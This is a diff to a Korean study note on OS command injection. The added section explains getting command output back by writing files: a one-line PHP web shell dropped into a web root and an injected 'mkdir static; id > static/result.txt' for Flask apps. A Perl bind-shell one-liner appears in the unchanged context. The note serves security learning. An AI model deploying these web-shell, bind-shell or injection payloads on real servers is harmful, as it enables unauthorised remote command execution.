@@ -309,7 +309,28 @@
                     ```perl
                     perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
                     ```
-    - **파일 생성**
+    - **파일 생성**: 어플리케이션 상에서 직접 확인할 수 있는 파일 시스템 경로 또는 어플리케이션 로직을 통해 확인할 수 있는 공간에 명령어의 실행 결과를 저장한 파일을 생성하는 방법
+        + **Script Engine**: 웹 루트 하위에 있는 폴더에 php/jsp/asp와 같은 **해석 가능한 파일을 만들어** 웹쉘 형태로 접근하는 방식
+            - 웹 서버가 지정한 경로를 알고 있고, 해당 경로에 파일 생성 권한이 있을 때 사용할 수 있음
+            - 웹 서버가 지정된 경로에 존재하는 파일을 브라우저에 표시한다는 점을 이용함 <br/> &nbsp;&nbsp; → 웹셸 파일을 업로드한 후 해당 페이지에 접속해 쉘을 실행하여 그 결과를 확인함
+            - 예시: 웹 서버에서 지정한 경로가 ```/var/www/html```이고, 해당 디렉터리에 파일 생성 권한이 존재하는 경우
+                ```
+                printf '<?=system($_GET[0])?>' > /var/www/html/uplaods/shell.php
+                ```
+                + ```{접속경로}/uploads/shell.php?0={명령어}```를 브라우저를 통해 방문하면 명령어의 실행 결과를 확인할 수 있음
+        + **Static File Directory**: Static File Directory에 OS 명령어의 결과를 파일로 생성시킨 후 접근하는 방식
+            - 프레임워크 또는 다양한 웹 어플리케이션에서 JS/CSS/Img 등의 정적 리소스를 다루기 위해 사용하는 Static File Directory에 파일 생성 권한이 있어야 사용할 수 있음
+                + 파이썬 Flask 프레임워크는 기본적으로 ```static```이 Static File Directory의 이름으로 설정되어 있음
+                    - ```static``` 디렉터리를 생성하지 않은 상황에서도 OS 명령어를 통해 ```static``` 디렉터리를 생성한 후 해당 디렉터리 내에 파일을 생성하여 확인할 수 있음 <br/> (프레임워크가 동작하는 디렉터리에 대한 생성 권한이 존재해야만 디렉터리 생성이 가능함)
+            - 예시: 파이썬 Flask 프레임워크의 Static File Directory(```static```)
+                ```
+                /?cmd=mkdir static; id > static/result.txt
+                ```
+                + OS 명령어(```mkdir```)를 통해 ```static``` 디렉터리를 생성한 후 ```id``` 명령어의 실행 결과를 ```result.txt``` 파일을 생성 후 저장함 <br/> &nbsp;&nbsp; → ```static/result.txt``` 페이지를 방문하면 실행 결과를 확인할 수 있음 
+
+<br/>
+
+* Network In/Out Bound의 제한이 걸려 있고 파일로 출력 값을 리다이렉션시켜 결과를 확인할 수 없을 때 사용할 수 있는 방법
 
 <br/><br/><br/>
 
